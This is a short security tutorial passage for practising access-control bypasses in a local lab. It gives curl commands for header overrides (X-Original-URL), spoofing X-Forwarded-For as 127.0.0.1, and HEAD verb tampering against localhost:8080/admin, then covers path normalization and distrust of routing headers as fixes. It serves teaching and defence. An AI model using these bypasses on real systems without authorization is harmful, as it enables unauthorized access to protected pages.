## 🚀 How to Practice Status Code Bypasses via curl
To automate or manually test these header and path bypass tricks inside your laboratory terminal, you pass the custom configurations directly using the -H (header) and -X (method) flags.

* Testing Header Overrides:

curl -i -s -H "X-Original-URL: /admin" "http://localhost:8080/"

* Testing Localhost Whitelist Spoofing:

curl -i -s -H "X-Forwarded-For: 127.0.0.1" "http://localhost:8080/admin"

* Testing Verb Tampering (HEAD method bypass):

curl -i -X HEAD "http://localhost:8080/admin"

[31, 32] 

## 🛡️ How Developers Secure This (The Patch)
To completely eliminate proxy-bypass vulnerabilities, security engineers implement Strict Normalization Rules and enforce Zero-Trust Access:

* Uniform Path Normalization: Ensure that both the front-facing proxy network and the backend server process and decode URL strings using the exact same standard engine. If a path is stripped or normalized, it must happen before security routing rules evaluate the page block. [33] 
* Ignore Trusted Routing Headers: Backend web applications should never trust headers like X-Forwarded-For or X-Original-URL for security decisions unless they come from a verified, strictly authenticated proxy source. [34, 35] 

